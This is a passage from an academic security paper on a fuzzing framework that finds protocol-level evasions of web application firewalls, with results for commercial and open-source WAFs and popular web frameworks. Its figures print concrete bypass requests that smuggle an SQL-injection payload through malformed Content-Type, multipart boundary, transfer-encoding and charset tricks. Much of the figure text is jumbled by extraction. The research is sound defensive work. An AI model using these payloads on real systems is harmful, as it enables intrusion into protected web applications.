processing time of the HTTP request by the target program,        WebApp Validator and the WAF Validator, we can conclude
and we set double the average time as the timeout time. This      that the sample can bypass the WAF and transmit malicious
helps to provide a reasonable timeout period that allows the      parameters to the WebApp. However, there are two problems
target program to proceed even if there are variations in the     in practice, one is that in the real world, a significant number
processing time caused by mutations.                              of cloud WAFs will modify the original HTTP request in
    For the last goal, we have selected the correspond-           some way, and the WebApp may receive a modified request
ing state-of-the-art (SOTA) fuzzing framework for different       sample rather than the original request sample. Therefore,
development languages. For example, we use LibAFL to              the above judgment may still be at risk of false positives and
fuzz PHP and Atheris to fuzz Python. To collect code              false negatives. The other issue is that a mutated sample may
coverage information during execution, we modify the target       have multiple factors that contribute to the WAF evasion, or
WebApps by inserting special instructions or using dynamic        may simply add some redundant fields to the original bypass
binary instrumentation tools. In the fuzzing process, when        factor. For Example, sample 5a is the initial sample, which
a sample is sent to WebApps, the Executor records the             becomes sample 5b after mutation, which is able to bypass
code coverage information to the shared memory. After             the WAF. By minimizing the bypass sample b, we can find
WebApps return the response or the timeout is exceeded, the       that there are actually two factors that determine the ability
coverage feedback module collects the coverage information        of sample 5b to bypass the WAF, which can be represented
and clears the shared memory. This approach allows us to          by the minimized sample 5c and the minimized sample 5d,
effectively collect code coverage data for further analysis       respectively. If we keep mutating the sample 5b, it will not
and improvements in the fuzzing process.                          only make it difficult for us to identify the true influencing
                                                                  factors, but it will also result in new samples of variation
4.4. WebApp Validator and WAF Validator                           that may appear inconsistent but share the same influencing
                                                                  factors.
    To detect protocol-level WAF evasion, we utilize the              To ensure the accuracy of the samples and isolate the
interfaces and functions provided by the web framework            different WAF bypass factors in a single mutated sample,
which we refer to as GetParameter Functions. These func-          we developed the Evasion Sample Centrifuge module. The
tions are used to extract the target parameter from HTTP          main idea behind this module is to replay and minimize
requests. Once we obtain the target parameter, we perform         the evasion sample by iteratively removing nodes from
validation to check if it matches the predefined parameter        the grammar tree until the corresponding request sample
key-value pairs: taint_key and taint_value.                       cannot bypass the WAF or fails to be correctly parsed
    When the obtained parameter key-value pairs match the         by the WebApp. The replay and minimizing process can
key-value pairs we filled in beforehand when generating           be described as algorithm 2 as shown in the Appendix.
the sample, we consider the sample to be parsed properly          To ensure that the samples can bypass the WAF and can
and we return the response with a specific status code            be correctly parsed by the WebApp, we send the request
SW EBAP P P ASS to indicate the end state of successful           samples saved by the WAF Validator to the WebApp for
                                                                                            different evasion samples. As shown in Figure 5, after
                    A
                                                          A                                 minimization, we separate two different types of evasions
                                                                                            samples 5c and 5d from sample 5b. In addition, it helps
                B       C                         B               C             B‘
                                                                                            avoid a large number of mutated samples sharing the same
                                                                                            factors that contribute to WAF evasion. Since the samples
            D       E                     D               E               D‘          E‘
                                                                                            we add to the corpus are those that remove the key nodes
       (a) original sample          (b) evasion sample after mutation                       and contribute to the WAF evasion, they could explore more
                                                                                            possible evasion approaches after further mutation.
                A                                             A



                                                      B               C          B‘
                                                                                            5. Evaluation and Findings
            B       C        B‘



        D       E       D‘                    D                            D‘          E‘   5.1. Methodology and Testing Environment
  (c) minimized evasion sample-a      (d) minimized evasion sample-b                          Web Framework      Language     Version     Github Star
                Figure 5. Evasion Sample Minimization                                         Laravel            PHP          9.19        73.8k
                                                                                              Django             Python       4.15        71.6k
                                                                                              Gin                Go           1.8.1       69.6k
secondary verification, instead of sending the original sam-                                  Spring-boot        Java         2.7.5       68k
ples directly to the WebApp Validator. Specifically, we also                                  Flask              Python       2.1.3       63.4k
deploy the WebApp Validators in this module. Throughout                                       Express            Node.js      4.18.2      61.2k
the continuous node deletion process, we send the sample                                      Fastapi            Python       0.88.0      59.5k
after node deletion to the corresponding WAF, whose WAF                                       Nest               Node.js      9.0.0       57.6k
Validator will save the real request sample that the WAF                                      Rails              Ruby         7.0.4       53.1k
will forward to the WebApp, and this sample will be sent to                                   Meteor             Node.js      2.8.0       43.5k
the deployed WebApp Validator. If this sample gets correctly                                  Koa                Node.js      2.14.1      34.1k
parsed by the WebApp validator, then we can conclude that                                     ASP.NET Core       .NET         6.0.12      32k
this sample can cause an effective WAF bypass in the real                                     Beego              Go           2.0.1       29.9k
                                                                                              Symfony            PHP          6.2.4       28.5k
world.
                                                                                              Fastify            Node.js      4.11.0      27.7k
    After minimization, samples in cmin will be added to the                                  Echo               Go           4.10.0      25.9k
corpus to undergo further mutation, and samples in smin will                                  Sails              Node.js      1.5.3       22.6k
be stored in Evasion Samples. Furthermore, the above algo-                                    Rocket             Rust         0.5.0-rc2   20.9k
rithm is only for one combination of one specific WAF with                                    CodeIgniter        PHP          4.0         18.2k
a single WebApp Validator. Since we save bypass samples                                       Webpy              Python       0.62        5.8k
in the corresponding WAF Validator, we can test multiple                                    TABLE 1. T ESTED OPEN SOURCE WEB FRAMEWORKS . (G ITHUB S TAR
WebApp Validator in parallel, which can help us test some                                                    COUNT AS OF J UNE 25, 2023)
web frameworks written in programming languages that do
not yet have a mature Coverage-Guided Fuzz framework,                                            To evaluate WAF Manis, we systematically analyze 8
such as ruby.                                                                               commercial WAFs, 6 open-source WAFs, and 20 popular
    In general, this module provides two optimizations for                                  web frameworks, as shown in table 2 and table 1. We
WAF Manis. For one thing, the minimization is supple-                                       collected commercial WAFs according to the global WAF
mentary to the pursuit of high code coverage. According                                     market share report [38] and the Forrester WAF report [12]
to Figure 3, we actually establish two corpus collection                                    and chose those WAFs that we could register accounts and
approaches to determine which sample should be added to                                     perform security testing. For open-source WAF, our list was
the corpus and undergo mutation first: 1) code coverage                                     collected by exploring the ”WAF” topic on GitHub [3] and
information in WebApp Executor and WAF evasion status.                                      subsequently selected those projects that have garnered the
The increment in code coverage means that the sample                                        most stars. We collected top-tier frameworks according to
triggers more code paths, which may include new unstable                                    the rankings from OSSinsight [31], which evaluates frame-
parsing features or old deprecated features that are still                                  works based on GitHub stars, pull requests, and issues.
present in the code. This can lead to inconsistencies in the                                     In this evaluation, We developed WebApp Validator for
semantic understanding of the same HTTP request samples                                     20 web frameworks and implemented WebApp Executors to
across implementations, resulting in WAF evasion. 2) ”reject                                collect code coverage of WebApp Validators based on PHP,
or not” information that we can get from the black-box                                      Python, and Rust languages. For each WAF Manis process,
WAFs to guide the sample mutation, which can help WAF                                       we chose one WebApp Validators to collect code coverage
Manis to find samples with incomplete protocol structure                                    for guiding the mutation, while we tested all the WebApp
that may have low code coverage but can also bypass                                         Validators in the Evasion Sample Centrifuge Module of each
WAF while being parsed correctly by WebApp, such as the                                     WAF Manis process to find WAF evasion vulnerabilities of
evasion example shown in the figure 2.                                                      the 20 web frameworks. Full tested GetParameter Function
    For another, the minimization makes it easy to classify                                 list is in Appendix table 5.
 Type        WAF                   Evasion Samples   Affected Web Framework1
             Microsoft Azure WAF   5                 13/20                                                      Malformed Parameter Structure    Parameter Type Confusion   RFC Support Gap
             Google Cloud Armor    5                 13/20                                                           WAFBrain
             Alibaba Cloud WAF     21                20/20                                                            Safeline
                                                                                                                     OpenWAF




                                                                               Web Application Firewall
             Cloudflare WAF        38                20/20
 Commercial
             Huawei Cloud WAF      40                20/20                                                               Naxis
             Safeline WAF          22                20/20                                                        Modsecurity
             Fortinet WAF          40                20/20                                                Microsoft Azure WAF
             Barracuda WAF         8                 20/20                                                            Janusec
             ModSecurity           2                 2/20                                                  Huawei Cloud WAF
             Naxis                 2                 2/20
                                                                                                                       Hihttps
             OpenWAF               13                20/20
 Open Source                                                                                              Google Cloud Armor
             Janusec               21                17/20
             WAFbrain              49                20/20
                                                                                                                 Fortinet WAF
             HiHTTPs               45                20/20                                                     Cloudflare WAF
                                                                                                               Barracuda WAF
        TABLE 2. S UMMARY OF PROTOCOL - LEVEL WAF EVASION                                                  Alibaba Cloud WAF
                   VULNERABILITIES WE DISCOVERED




                                                                                                                                       koa




                                                                                                                                     s t
                                                                                                                                   b core
                                                                                                                             cod eego
                                                                                                                                  djaniter
                                                                                                                                     ec o
                                                                                                                                 exp ho

                                                                                                                                   fast pi
                                                                                                                                          k
                                                                                                                                       gin

                                                                                                                                  met vel



                                                                                                                              spri ails
                                                                                                                                sym oot
                                                                                                                                  webony
                                                                                                                                        py
                                                                                                                                      ress

                                                                                                                                     flasy




                                                                                                                                   nes or
                                                                                                                                      railss
                                                                                                                                         e
        1. T HE AMOUNT INCLUDES ALL EVASION CASES FOR THE




                                                                                                                                        tj
                                                                                                                                        if
                                                                                                                                        g


                                                                                                                                       a




                                                                                                                                   rock
                                                                                                                                       e
                                                                                                                                  lara
                                                                                                                                  fast




                                                                                                                                  ngb
                                                                                                                                 eign




                                                                                                                                     f
                                                                                                                                 net
                       CORRESPONDING WAF




                                                                                                                            asp
                                                                                                                                                Web Application
     Comparison with State-of-the-Art Tools. Prior to de-
ploying our tool for testing various WAFs, we initially
utilized two state-of-the-art (SOTA) WAF testing tools:                                                   Figure 6. WAFs/WebApps pairs affected by three types of attacks
xwaf [6] (a wrapper of SQLmap [43] specifically designed
to identify WAF evasions) and WAFNinja [27] to assess our
collection of WAFs. These results illustrate that both xwaf                       as Flask, will use the last one as the basis for select-
and WAFNinja were unable to bypass the evaluated WAFs,                            ing the parser. So an attacker can confuse the WAF into
as shown in Appendix table 3.                                                     thinking that the request body is JSON but smuggle data
                                                                                  as urlencoded-form by setting two Content-Type Headers,
5.2. Findings                                                                     the first one is application/json, the second one is
                                                                                  application/x-www-form-urlencoded. Figure 7a
    After about three days of fuzzing, WAF Manis had gen-                         shows an example produced by WAF Manis.
erated around 108668 samples for each WebApp Validator.In                             Content-Type Variant. According to RFC 7230 and
total,WAF Manis found 311 protocol-level evasion cases                            RFC 2045, The Content-Type header consists of a media
affecting all tested WAFs and web applications. We list some                      type followed by optional parameters. The media type
of the mutated samples found by WAF Manis in Appendix                             is typically represented as a MIME type, which is a
table 4, and the final results of the vulnerabilities found are                   standardized format for describing the nature and format of
shown in table 2.                                                                 a file. The HTTP protocol does not restrict the media type
    We classified those evasion cases into three categories                       for submitting parameters, but the current de facto standards
based on the possible causes and WAFs’ behaviors: (1)                             include application/x-www-form-urlencoded,
Parameter Type Confusion; (2) Malformed Parameter Struc-                          application/json,              application/xml            and
ture; (3) RFC Support Gap. We present the examples of the                         multipart/form-data. Most WAFs currently support
three evasion types in Figure 6 , and the details of each                         the detection of these parameters (Google Cloud armor only
category are illustrated in the following.                                        supports application/x-www-form-urlencoded
    Category 1: Parameter Type Confusion. To parse the                            and application/json [16]). However, in practice,
content of a parameter correctly, the first primary require-                      the actual payload and these protocol names are not in
ment is to identify the type of the parameter accurately.                         the one-to-one correspondence. For example, as shown in
However, there are multiple fields and values in the HTTP                         Figure 6, flask will treat the body as JSON when Content-
implementation standard that can be used to indicate the type                     Type values start with application/x- and end with
of the parameter, so if there are semantic gaps between the                       +json. And webpy will treat arbitrary mime values
WAF and the WebApp, an attacker can craft a malicious                             starting with multipart as multipart/form-data,
payload to confuse the WAF to parse the payload content                           so an attacker can construct a Content-Type value that can
with the incorrect parser, causing a WAF evasion.                                 be accepted by the WebApps but confusing the WAFs from
    Multiple Content-Type Headers. According to RFC                               choosing a correct parser, resulting in the evasion.
7230, A sender MUST NOT generate multiple header                                      Category 2: Malformed Parameter Structure. Besides
fields with the same field name in a message unless ei-                           tricking the WAF into using the wrong parser to parse
ther the entire field value for that header field is defined                      HTTP requests, an attacker can also construct malformed
as a comma-separated list or the header field is a well-                          data so that the WAF will not find the parameter containing
known exception. However, many implementations still tol-                         the malicious payload while the WebApp takes them. By
erate these behaviors. When dealing with multiple Content-                        benefiting from the mutation and minimization of the WAF
Type headers, some WAFs, such as ModSecurity, will use                            Manis, we have found many malformed samples that are
the value of the first header as the basis for selecting                          capable of interfering with the parsing process of WAF,
a parameter parser, while some web frameworks, such                               which is hard to discover through manual auditing.
                                                                                                                                           Content-Type: application/xml                             Content-Type: application/xml
                                                                                                                                           Content-Type:
                                                                                                                                           POST          application/x-www-form-
                                                                                                                                                  /admin HTTP/1.1*                                   Content-Type:
                                                                                                                                                                                                     POST          application/x-www-form-
                                                                                                                                                                                                            /admin HTTP/1.1*
                  POST /admin HTTP/1.1                                       POST /admin HTTP/1.1                                          --boundary
                                                                                                                                           urlencoded                                                --boundary
                                                                                                                                                                                                     urlencoded
                  Host: target                                               Host: target                                                  Host: target
                                                                                                                                           Content-Disposition: form-data; name="id";                Host: target
                                                                                                                                                                                                     Content-Disposition: form-data; name="id";
                  POST   /admin HTTP/1.1
                  Content-Type:  multipart/form-data;                        POST   /admin HTTP/1.1
                                                                             Content-Type: multipart/form-data;                            Content-Type: multipart/form-data;                        Content-Type: multipart/form-data;
                  Host: target"boundary";                                    Host: target                                                  <a>1=1<!-- &id=1'or(1)#&b= --></a>                        <a>1=1<!-- &id=1'or(1)#&b= --></a>
                  boundary=                                                  boundary="boundary";                                          boundary=boundary
                                                                                                                                           1'or(1)#                                                  boundary=boundary
                                                                                                                                                                                                     1'or(1)#
                  Content-Type: application/xml                              Content-Type: application/xml                                                                                           --boundary--
                                                                                                                                           --boundary--
                  Content-Type:
                  --boundary     application/x-www-form-                     Content-Type:
                                                                             --boundary    application/x-www-form-                         --boundary                                                --boundary
                  urlencoded
                  Content-Disposition: form-data; name="id";                 urlencoded
                                                                             Content-Disposition: form-data; name="id";                    Content-Disposition: form-data; name="id"                 Content-Disposition: form-data; name="id"
                                                                                                                                           Content-Transfer-Encoding: quoted-printable               Content-Transfer-Encoding: quoted-printable
                  <a>1=1<!--
                  1'or(1)#   &id=1'or(1)#&b= --></a>                         <a>1=1<!--
                                                                             1'or(1)#   &id=1'or(1)#&b= --></a>                                                               Pass
                  --boundary--                                               --boundary--                                    Attacker      =31=27=6f=72=28=31=29=23                                  =31=27=6f=72=28=31=29=23
                                                                                                                                           --boundary--Modsecurity WAF Pass                          --boundary--    Flask
                                                                                                                             Attacker                Cloudflare
                                                                                                                                               Recognize        WAF as xml
                                                                                                                                                         Content-Type                               Recognize Content-Type
                                                                                                                                                                                                               Any WebApp  as url-form
                                                    Pass                                                                                   Recognize quotes as part of boundary                     Recognize boundary without quotes
   Attacker                    Modsecurity WAF Pass                                             Flask                                                                         Pass
                                                                                                                                           POST /admin HTTP/1.1                                      POST /admin HTTP/1.1
   Attacker                 Cloudflare WAF                                              Any WebApp                           Attacker                 Google  Cloud Armor                                   /adminGo-based
                                                                                                                                                                                                                   HTTP/1.1* App
                      Recognize Content-Type as xml                          Recognize Content-Type as url-form                            POSTtarget
                                                                                                                                           Host:  /admin HTTP/1.1*                                   POST
                                                                                                                                                                                                     Host: target
                                                                                                                                           Host: target multipart/form-data;
                                                                                                                                           Content-Type:                                             Host: target multipart/form-data;
                                                                                                                                                                                                     Content-Type:
                  Recognize
                  POST   /adminquotes   as part of boundary
                                 HTTP/1.1                                   Recognize  boundary
                                                                             POST /admin HTTP/1.1without quotes                           Don't  recognize
                                                                                                                                           Content-Type:    Content-Transfer-Encoding
                                                                                                                                                         multipart/form-data;                        Recognize
                                                                                                                                                                                                     Content-Type:Content-Transfer-Encoding
                                                                                                                                                                                                                   multipart/form-data;
                                                                                                                                           boundary=  "boundary  ";                                  boundary="boundary";
                  Host: target                                               Host: target                                                  boundary=boundary                                         boundary=boundary
                  Content-Type: application/xml                              Content-Type: application/xml
                  POST /admin HTTP/1.1                                       POST /admin HTTP/1.1                                          --boundary                                                --boundary
                  Content-Type:  application/x-www-form-
                  POST /admin HTTP/1.1*                                      Content-Type:   application/x-www-form-
                                                                             POST /admin HTTP/1.1*                                         --boundary                                                --boundary
                  Host: target                                               Host: target                                                  Content-Disposition: form-data; name="id";                Content-Disposition: form-data; name="id";
                  urlencoded
                  Host: target                                               urlencoded
                                                                             Host: target                                                  Content-Disposition: form-data; name="id"                 Content-Disposition: form-data; name="id"
                  Content-Type: multipart/form-data;                         Content-Type: multipart/form-data;
                  Content-Type: multipart/form-data;                         Content-Type: multipart/form-data;                            Content-Transfer-Encoding: quoted-printable
                                                                                                                                           1'or(1)#                                                  Content-Transfer-Encoding: quoted-printable
                                                                                                                                                                                                     1'or(1)#
                  boundary="&id=1'or(1)#&b=
                  <a>1=1<!--   boundary";      --></a>                       boundary="boundary";
                                                                             <a>1=1<!--   &id=1'or(1)#&b= --></a>
                  boundary=boundary                                          boundary=boundary                                             --boundary--                                              --boundary--
                                                                                                                                           POST   /admin HTTP/1.1
                                                                                                                                           =31=27=6f=72=28=31=29=23                                  POST   /admin HTTP/1.1
                                                                                                                                                                                                     =31=27=6f=72=28=31=29=23
                  --boundary                                                 --boundary                                                    Host: target                                              Host: target
                  --boundary                                                 --boundary                                                    --boundary--                                              --boundary--
                  Content-Disposition: form-data; name="id";                 Content-Disposition: form-data; name="id";                    Content-Type: multipart/form-                             Content-Type: multipart/form-
                  Content-Disposition: form-data; name="id"                  Content-Disposition: form-data; name="id"
                  Content-Transfer-Encoding: quoted-printable                Content-Transfer-Encoding: quoted-printable                   data;boundary*=us-ascii''boundary;                        data;boundary*=us-ascii''boundary;
                  1'or(1)#                                                   1'or(1)#
                                                    Pass                     --boundary--
                  --boundary--                                                                                                             --boundary                        Pass                    --boundary
                  =31=27=6f=72=28=31=29=23                                   =31=27=6f=72=28=31=29=23
   Attacker
                  --boundary--Modsecurity WAF                                --boundary--       Flask                        Attacker      Content-Disposition: form-data; name="id";
                                                                                                                                                       Cloudflare WAF Pass
                                                                                                                                                                                                     Content-Disposition: form-data; name="id";
                                                                                                                                                                                                                     Any WebApp
                      Recognize Content-Type as xml                          Recognize Content-Type as url-form              Attacker       1'or(1)# Google Cloud Armor                               1'or(1)#    Go-based  App quotes
                                                                                                                                           Recognize    quotes as partPass
                                                                                                                                                                       of boundary                  Recognize    boundary without
                                                                                                                                           --boundary--                                              --boundary--
                                                                                                                                                 Modsecurity
                                                                                                                                          Don't recognize    WAF
                                                                                                                                                          Content-Transfer-Encoding                      Flask Content-Transfer-Encoding
                                                                                                                                                                                                    Recognize
                                           Pass
(a)Attacker
     Different Preferences of Content-Type Pass headers (CVE-2023-38199). (b) Differences in parsing boundary parameter, which can exploit all
            POST /adminCloudflare
                          HTTP/1.1 WAF                        Any WebApp
                                                 POST /admin HTTP/1.1                POST /admin HTTP/1.1*                POST /admin HTTP/1.1*
  Attacker  Host: targetGoogle Cloud Armor       Host: target Go-based App
                                                                           web applications
                                                                                     Host: target behind the Cloudflare WAF.
                                                                                                                          Host: target
                  Recognize quotes
                  Content-Type:        as part of boundary
                                multipart/form-data;                        Recognize   boundary
                                                                             Content-Type:          without quotes
                                                                                           multipart/form-data;                            Content-Type: multipart/form-data;                        Content-Type: multipart/form-data;
                 Don't recognize
                  boundary=       Content-Transfer-Encoding
                            "boundary ";                                    Recognize    Content-Transfer-Encoding
                                                                             boundary="boundary";                                          boundary=boundary                  Pass                   boundary=boundary
                                                                                                                             Attacker                 Huawei Cloud WAF                                              Spring WebApp
                  POST /admin HTTP/1.1*
                  --boundary                                                 POST /admin HTTP/1.1*
                                                                             --boundary                                                    --boundary
                                                                                                                                           POST /admin HTTP/1.1                                      --boundary
                                                                                                                                                                                                     POST /admin HTTP/1.1
                  Host: target                                               Content-Disposition:
                                                                             Host: target         form-data; name="id";                    Host: target
                                                                                                                                           Content-Disposition: form-data; name="id"                Host: target
                                                                                                                                                                                                    Content-Disposition:
                                                                                                                                                                                                  Support   RFC2331 and  form-data; name="id"
                                                                                                                                                                                                                            recognize
                  Content-Disposition: form-data; name="id";                                                                               Don't supportmultipart/form-
                                                                                                                                           Content-Type:
                                                                                                                                                           RFC2331     and recognize                Content-Type: multipart/form-quoted-printable
                  Content-Type: multipart/form-data;                         Content-Type: multipart/form-data;                            Content-Transfer-Encoding:  quoted-printable             Content-Transfer-Encoding:
                                                                                                                                           boundary as NULL                                       boundary   as boundary
                  1'or(1)#
                  boundary=boundary                                          1'or(1)#
                                                                             boundary=boundary                                             data;boundary*=us-ascii''boundary;                        data;boundary*=us-ascii''boundary;
                  --boundary--                                               --boundary--                                                  =31=27=6f=72=28=31=29=23                                  =31=27=6f=72=28=31=29=23
                  POST   /admin HTTP/1.1
                  --boundary                                                 POST   /admin HTTP/1.1
                                                                             --boundary                                                    --boundary--                                              --boundary--
                  Host: target                                               Host: target                                                  Content-Disposition: form-data; name="id";                Content-Disposition: form-data; name="id";
                  Content-Disposition: form-data; name="id"                  Content-Disposition: form-data; name="id"
                  Content-Type: multipart/form-                              Content-Type: multipart/form-
                  Content-Transfer-Encoding: quoted-printable                Content-Transfer-Encoding: quoted-printable
                  data;boundary*=us-ascii''boundary;                         data;boundary*=us-ascii''boundary;                             1'or(1)#                    Pass                          1'or(1)#
                  =31=27=6f=72=28=31=29=23                                   =31=27=6f=72=28=31=29=23                                      --boundary--                                              --boundary--
                  --boundary                        Pass                     --boundary                                                           Modsecurity WAF                                       Flask
                  --boundary--                                               --boundary--                                                  POST /post HTTP/1.1               Pass                    POST /post HTTP/1.1
                  Content-Disposition: form-data; name="id";                 Content-Disposition: form-data; name="id";
   Attacker                     Cloudflare WAF                                              Any WebApp                       Attacker      Accept: */* Google Cloud Armor                            Accept: */* Go-based App
                                                                                                                                           Host: target                                              Host: target
                   1'or(1)#                                                   1'or(1)#
                  Recognize quotes as partPass
                  --boundary--
                                           of boundary                      Recognize
                                                                             --boundary--
                                                                                         boundary without quotes                           Content-Type:
                                                                                                                                          Don't          application/x-www-form-
                                                                                                                                                 recognize  Content-Transfer-Encoding                Content-Type:
                                                                                                                                                                                                     Recognize     application/x-www-form-
                                                                                                                                                                                                                  Content-Transfer-Encoding
                         Modsecurity WAF                                         Flask                                                     urlencoded; charset=utf-7        Pass                     urlencoded; charset=utf-7
                                                    Pass                                                                                                         Pass
                                                                                                                             Attacker              Huawei Cloud WAF
                                                                                                                                           +AGkAZA-=+ADEAJwBvAHIAKAAxACkAIw-                                  Spring WebApp
                                                                                                                                                                                                     +AGkAZA-=+ADEAJwBvAHIAKAAxACkAIw-
   Attacker       POST /admin  HTTP/1.1*
                             Google  Cloud Armor                             POST /adminGo-based
                                                                                           HTTP/1.1* App                                         Modsecurity WAF                                        Flask
                  Host: target                                               Host: target                                                                                                         Support RFC2331 and recognize
                                                                                                                                           Don't support RFC2331 and recognize
                  Content-Type:
                 Don't          multipart/form-data;
                        recognize Content-Transfer-Encoding                  Content-Type:
                                                                             Recognize     multipart/form-data;
                                                                                          Content-Transfer-Encoding
                                                     Pass                                                                                  boundary as NULL                                       boundary as boundary
                  boundary=boundary                                          boundary=boundary
                                                                                                                                           POST /admin HTTP/1.1                                      POST /admin HTTP/1.1
(c)Attacker
       Differences
             --boundary
                        Huawei
                          in Cloud       WAF
                                   recognizing                              Spring WebApp
                                                         Content-Transfer-Encoding
                                                                --boundary                            (CTE) (d) Differences
                                                                                                                         Host: targetin supporting RFC 2331 standard,
                                                                                                                                                          Pass
                                                                                                                                                                         Host: target    which can bypass
             Content-Disposition: form-data;                                                                             Content-Type: multipart/form-                   Content-Type: multipart/form-
header, which       bypasses
             Don't support   RFC2331     andname="id"
                                       major recognize          Content-Disposition:
                                                              Support
                                                 WAFs including        RFC2331 and
                                                                      Google         form-data;
                                                                                        recognize
                                                                                      Cloud,    name="id"
                                                                                                              Attacker Cloud
                                                                                                  Fortinet, Huawei                WAF     toAzure
                                                                                                                                               exploit
                                                                                                                         data;boundary*=us-ascii''boundary; Java Spring applications.
                                                                                                                                                                         data;boundary*=us-ascii''boundary;
             Content-Transfer-Encoding: quoted-printable        Content-Transfer-Encoding:
                                                              boundary as boundary          quoted-printable                       Mircosoft         WAF                              Django  WebApp
             boundary as NULL
and Azure=31=27=6f=72=28=31=29=23
               WAF to exploit Go-based web applications.        =31=27=6f=72=28=31=29=23
                                                                                                                        Don't  support charset and recognize the
                                                                                                                         --boundary                                    Support  charset and recognize the
                                                                                                                                                                         --boundary
                  POST /admin HTTP/1.1                                       POST /admin HTTP/1.1
                  --boundary--
                  Host: target                                               --boundary--
                                                                             Host: target                                                 paramter     as +AFkAZA-=+ADE...
                                                                                                                                           Content-Disposition:   form-data; name="id";          parmeter      as id = 1'or(1)#
                                                                                                                                                                                                      Content-Disposition:   form-data; name="id";
                                                                                                                                           POST /post HTTP/1.1                                        POST /post HTTP/1.1
                  Content-Type: multipart/form-                              Content-Type: multipart/form-                                 Accept:
                  data;boundary*=us-ascii''boundary;                         data;boundary*=us-ascii''boundary;                             1'or(1)#*/*                   Pass
                                                                                                                                                                                                      Accept:
                                                                                                                                                                                                       1'or(1)#*/*
                                                                                                                                     POSTHost:
                                                                                                                                            /post target
                                                                                                                                                  HTTP/1.1                                   POST /post   HTTP/1.1
                                                                                                                                                                                                      Host:  target
                                                                                                                                           --boundary--                                               --boundary--
                                                                                                                                     Host: target  Modsecurity
                                                                                                                                           Content-Type:           WAF
                                                                                                                                                           application/x-www-form-           Host: target Flask
                                                                                                                                                                                                      Content-Type:    application/x-www-form-
                  --boundary                                                 --boundary                                              Content-Type:   multipart/form-data;boundary=boundary
                                                                                                                                           urlencoded;   charset=utf-7                       Content-Type:    multipart/form-data;boundary=boundary
                                                                                                                                                                                                      urlencoded;   charset=utf-7
                  POST /post HTTP/1.1form-data; name="id";
                  Content-Disposition:            Pass                       POST /post HTTP/1.1form-data; name="id";
                                                                             Content-Disposition:
                                                                                                                                                                         Pass
   Attacker       Accept: */*Google Cloud Armor                              Accept: */*                                             --boundary
                                                                                                                                           +AGkAZA-=+ADEAJwBvAHIAKAAxACkAIw-                 --boundary
                                                                                                                                                                                                     +AGkAZA-=+ADEAJwBvAHIAKAAxACkAIw-
                   1'or(1)#                    Pass                           1'or(1)#     Go-based App                                          Modsecurity
                                                                                                                                     Content-Disposition:        WAF
                                                                                                                                                          form-data; name="id"                          Flask form-data; name="id"
                                                                                                                                                                                             Content-Disposition:
                  Host:  target                                              Host:  target
                  --boundary--
                  Content-Type: application/x-www-form-                      --boundary--
                                                                             Content-Type: application/x-www-form-                   Content-Type: multipart/form-data; charset="utf-16le"
                                                                                                                                                                             Pass            Content-Type: multipart/form-data; charset="utf-16le"
                 Don't  recognize  Content-Transfer-Encoding
                          Modsecurity  WAF                                   Recognize
                                                                               Flask Content-Transfer-Encoding
                  urlencoded; charset=utf-7                                  urlencoded; charset=utf-7                       Attacker                  Huawei Cloud WAF
                                                                                                                                     1\0'\0o\0r\0(\01\0)\0#\0                                                      Spring WebApp
                                                                                                                                                                                             1\0'\0o\0r\0(\01\0)\0#\0
                                        Pass
                  +AGkAZA-=+ADEAJwBvAHIAKAAxACkAIw-                          +AGkAZA-=+ADEAJwBvAHIAKAAxACkAIw-                       --boundary--                                            --boundary--
                         Modsecurity WAF                                         Flask                                                     Don't support RFC2331 and recognize
                                                                                                                                                                      Pass                        Support RFC2331 and recognize
                                                                                                                                           boundary as NULL                                       boundary as boundary
                                                    Pass                                                                     Attacker              Mircosoft Azure WAF                                           Django WebApp
   Attacker       POST /adminHuawei   Cloud WAF
                                 HTTP/1.1                                    POST /adminSpring
                                                                                           HTTP/1.1WebApp                                 Don't support charset and recognize the                Support charset and recognize the
                  Host: target                                               Host: target                                                 paramter as +AFkAZA-=+ADE...  Pass
                                                                                                                                                                                                 parmeter as id = 1'or(1)#
                  Don't supportmultipart/form-
                  Content-Type:                    Pass
                                   RFC2331 and recognize                   Support   RFC2331
                                                                             Content-Type:       and recognize
                                                                                            multipart/form-
   Attacker       boundaryMircosoft
                               as NULLAzure WAF
                  data;boundary*=us-ascii''boundary;                       boundary   as Django
                                                                                          boundary
                                                                             data;boundary*=us-ascii''boundary;
                                                                                                   WebApp                    Attacker                 Alibaba Cloud WAF                                         Express WebApp
                                                                                                                                     POST /post HTTP/1.1                                     POST /post HTTP/1.1
                 Don't  support charset and recognize the                 Support  charset and recognize the                         Host:Don't
                                                                                                                                           targetsupport Content-Type in multipart and       Host: target
                                                                                                                                                                                                     Support Content-Type in multipart and
                  --boundary                                                 --boundary                                                    POST /post    HTTP/1.1                                     POST multipart/form-data;boundary=boundary
                                                                                                                                                                                                             /post HTTP/1.1
                                                                                                                                     Content-Type:   multipart/form-data;boundary=boundary   Content-Type:
                 paramter   as +AFkAZA-=+ADE...
                  Content-Disposition: form-data; name="id";              parmeter  as id = 1'or(1)#
                                                                             Content-Disposition: form-data; name="id";                   get  paramter as id = 1\0'\0o\0r\0(\01\0)\0#\0             decode    parameter as id = 1'or(1)#
                                                                                                                                           Accept: */*                                                Accept: */*
                                                                                                                                           Host: target
                                                                                                                                     --boundary                                                       Host: target
                                                                                                                                                                                             --boundary
              1'or(1)#                                                 1'or(1)#
(e) Differences          in recognizing
       POST /post HTTP/1.1
             --boundary--
                                            Pass    charsetPOST parameter
                                                                    /post HTTP/1.1 header, which by- (f) Differences in supporting Content-Type header in multipart data,
                                                                      --boundary--
                                                                                                                                           Content-Type: application/x-www-form-
                                                                                                                                     Content-Disposition:  form-data; name="id"                       Content-Type:   application/x-www-form-
                                                                                                                                                                                             Content-Disposition: form-data;   name="id"
                                                                                                                                           urlencoded;   charset=utf-7 charset="utf-16le"             urlencoded;  charset=utf-7 charset="utf-16le"
passesHost: target Modsecurity WAF
         major
       Content-Type:  WAFs
             POST /postmultipart/form-data;boundary=boundary
                          HTTP/1.1
                                   including Microsoft       Host: targetFlask
                                                                 Azure
                                                             Content-Type:      WAF to exploit Django which can bypass Alibaba Cloud WAF to exploit Express-based ap-
                                                                      POST multipart/form-data;boundary=boundary
                                                                              /post HTTP/1.1
                                                                                                                                     Content-Type:   multipart/form-data;
                                                                                                                                                                          Pass
                                                                                                                                                                                             Content-Type:   multipart/form-data;

                                                                                                                                           +AGkAZA-=+ADEAJwBvAHIAKAAxACkAIw-
                                                                                                                                                    +AGkAZA-=+ADEAJwBvAHIAKAAxACkAIw-
web applications.
             Accept: */*
       --boundary
                                                                      Accept: */*
                                                             --boundary
